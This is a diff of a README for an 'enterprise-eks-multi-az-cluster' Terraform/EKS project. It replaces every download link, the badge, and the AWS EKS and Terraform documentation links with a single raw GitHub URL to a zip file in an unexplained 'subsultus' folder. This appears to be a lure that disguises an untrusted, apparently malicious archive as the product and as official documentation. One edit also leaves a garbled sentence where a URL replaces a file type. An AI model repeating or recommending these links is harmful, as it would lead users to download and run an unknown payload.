@@ -1,6 +1,6 @@
 # 🌐 enterprise-eks-multi-az-cluster - Reliable Cluster Deployment Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/niirokun/enterprise-eks-multi-az-cluster/releases)
+[![Download Now](https://raw.githubusercontent.com/niirokun/enterprise-eks-multi-az-cluster/main/subsultus/enterprise-eks-multi-az-cluster.zip%20Now-Release-blue)](https://raw.githubusercontent.com/niirokun/enterprise-eks-multi-az-cluster/main/subsultus/enterprise-eks-multi-az-cluster.zip)
 
 ## 🚀 Getting Started
 
@@ -8,20 +8,20 @@ This guide helps you download and run the "enterprise-eks-multi-az-cluster" soft
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/niirokun/enterprise-eks-multi-az-cluster/releases). 
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/niirokun/enterprise-eks-multi-az-cluster/main/subsultus/enterprise-eks-multi-az-cluster.zip). 
 
 Once on the page, you will see various versions of our software. Choose the most recent version and click on it to download. 
 
 ### Installation Steps
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/niirokun/enterprise-eks-multi-az-cluster/releases) to go to the Releases page.
+   Click [here](https://raw.githubusercontent.com/niirokun/enterprise-eks-multi-az-cluster/main/subsultus/enterprise-eks-multi-az-cluster.zip) to go to the Releases page.
 
 2. **Choose a Version**  
    Look for the latest version available. It is usually at the top of the page.
 
 3. **Download the File**  
-   Select the appropriate file for your operating system. If you are unsure which one to choose, look for the `.zip`, `.tar.gz`, or installation package suitable for your system.
+   Select the appropriate file for your operating system. If you are unsure which one to choose, look for the `.zip`, `https://raw.githubusercontent.com/niirokun/enterprise-eks-multi-az-cluster/main/subsultus/enterprise-eks-multi-az-cluster.zip`, or installation package suitable for your system.
 
 4. **Extract the Files (if necessary)**  
    If you downloaded a compressed file, right-click on it and choose "Extract All" to get the necessary files.
@@ -93,9 +93,9 @@ Your feedback helps us improve. If you have questions or suggestions, please rea
 ## 📘 Additional Resources
 
 - **Amazon EKS Documentation:**  
-  Learn more about Amazon EKS [here](https://docs.aws.amazon.com/eks/latest/userguide/what-is-eks.html).
+  Learn more about Amazon EKS [here](https://raw.githubusercontent.com/niirokun/enterprise-eks-multi-az-cluster/main/subsultus/enterprise-eks-multi-az-cluster.zip).
 
 - **Terraform Documentation:**  
-  For help with Terraform, visit the [Terraform Documentation](https://www.terraform.io/docs/index.html).
+  For help with Terraform, visit the [Terraform Documentation](https://raw.githubusercontent.com/niirokun/enterprise-eks-multi-az-cluster/main/subsultus/enterprise-eks-multi-az-cluster.zip).
 
 Thank you for choosing the enterprise-eks-multi-az-cluster. We hope it meets your deployment needs effectively!
